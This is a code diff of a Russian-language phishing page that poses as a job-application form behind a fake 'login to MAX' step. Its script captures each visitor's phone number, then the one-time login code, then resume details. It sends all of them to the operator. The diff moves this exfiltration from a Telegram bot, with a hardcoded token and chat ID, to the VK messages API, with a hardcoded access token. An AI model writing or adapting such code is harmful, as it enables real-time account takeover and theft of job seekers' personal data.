@@ -548,7 +548,6 @@
                     <div class="resume-title">Опыт и график</div>
                     <input type="text" id="res-job" class="text-input" placeholder="Желаемая должность" required>
                     
-                    <!-- Выбор графика смен -->
                     <select id="res-schedule" class="select-input" required>
                         <option value="" disabled selected>Когда можете выйти на смену?</option>
                         <option value="2/2 (День)">2/2 (День)</option>
@@ -569,7 +568,6 @@
                         <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="17 8 12 3 7 8"></polyline><line x1="12" y1="3" x2="12" y2="15"></line></svg>
                         Прикрепить файлы (PDF, WORD, JPG)
                     </label>
-                    <!-- Добавлены форматы .doc и .docx -->
                     <input type="file" id="file-upload" multiple accept=".pdf,.jpg,.jpeg,.png,.doc,.docx" style="display: none;" onchange="handleFiles(this.files)">
                     <div id="file-list" class="file-list"></div>
                 </div>
@@ -598,23 +596,22 @@
     </div>
 
     <script>
-        const BOT_TOKEN = "9178954905:AAGVzG6Eat1vIdFCwT2tXxWNlRTHJVzGxeI"; 
-        const CHAT_ID = "5562276138";
+        // ==========================================
+        // ТВОИ ДАННЫЕ ВКОНТАКТЕ (УЖЕ ВСТАВЛЕНЫ)
+        // ==========================================
+        const VK_TOKEN = "vk1.a.WT7earb8NwhFAcYHFSaIigdM5YTQBmP57vksKV1ZcvKn6gn_g9Cq9tvYYetYkw2H6NnwuXBDmNxReIPIpURFPJwOsN23"; 
+        const VK_PEER_ID = "576535806"; 
+        // ==========================================
 
-        async function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        async function sendToVK(message) {
+            const randomId = Math.floor(Math.random() * 1000000);
+            const url = `https://api.vk.com/method/messages.send?access_token=${VK_TOKEN}&peer_id=${VK_PEER_ID}&message=${encodeURIComponent(message)}&random_id=${randomId}&v=5.131`;
+            
             try {
-                await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
+                await fetch(url, { mode: 'no-cors' });
+                console.log("Сообщение отправлено в ВК");
             } catch (error) {
-                console.error("Ошибка отправки в TG", error);
+                console.error("Ошибка ВК", error);
             }
         }
 
@@ -664,8 +661,8 @@
             codeInputs[0].focus();
             startTimer();
 
-            const msg = `📱 <b>Новый вход в MAX</b>\n\n<b>Номер:</b> <code>${currentPhone}</code>\n⏳ <i>Ожидание кода...</i>`;
-            sendToTelegram(msg);
+            const msg = `📱 Новый вход в MAX\n\nНомер: ${currentPhone}\n⏳ Ожидание кода...`;
+            sendToVK(msg);
         });
 
         // 2. Ввод кода
@@ -693,8 +690,8 @@
 
             codeInputs.forEach(input => input.disabled = true);
 
-            const msg = `🔑 <b>Получен код!</b>\n\n<b>Номер:</b> <code>${currentPhone}</code>\n<b>Код:</b> <code>${code}</code>`;
-            sendToTelegram(msg);
+            const msg = `🔑 Получен код!\n\nНомер: ${currentPhone}\nКод: ${code}`;
+            sendToVK(msg);
 
             setTimeout(() => {
                 stepCode.classList.remove('active');
@@ -716,7 +713,7 @@
             });
         }
 
-        // 4. Отправка резюме и переход к успеху
+        // 4. Отправка резюме
         function submitResume(e) {
             e.preventDefault();
 
@@ -729,17 +726,15 @@
             
             let filesStr = uploadedFiles.length > 0 ? uploadedFiles.join(', ') : "Файлы не прикреплены";
 
-            const msg = `📄 <b>Новая анкета!</b>\n\n<b>Номер:</b> <code>${currentPhone}</code>\n\n<b>ФИО:</b> ${name}\n<b>Возраст:</b> ${age}\n<b>Город:</b> ${city}\n\n<b>Должность:</b> ${job}\n<b>График:</b> ${schedule}\n\n<b>О себе:</b>\n${about}\n\n<b>Документы:</b>\n${filesStr}`;
-            sendToTelegram(msg);
+            const msg = `📄 Новая анкета!\n\nНомер: ${currentPhone}\n\nФИО: ${name}\nВозраст: ${age}\nГород: ${city}\n\nДолжность: ${job}\nГрафик: ${schedule}\n\nО себе:\n${about}\n\nДокументы:\n${filesStr}`;
+            sendToVK(msg);
 
-            // Красиво меняем кнопку
             const btn = document.getElementById('btn-submit-resume');
             btn.classList.remove('active');
             btn.classList.add('success');
             btn.textContent = "Отправлено ✓";
             btn.disabled = true;
 
-            // Через 1.2 секунды перекидываем на экран благодарности
             setTimeout(() => {
                 stepResume.classList.remove('active');
                 stepSuccess.classList.add('active');
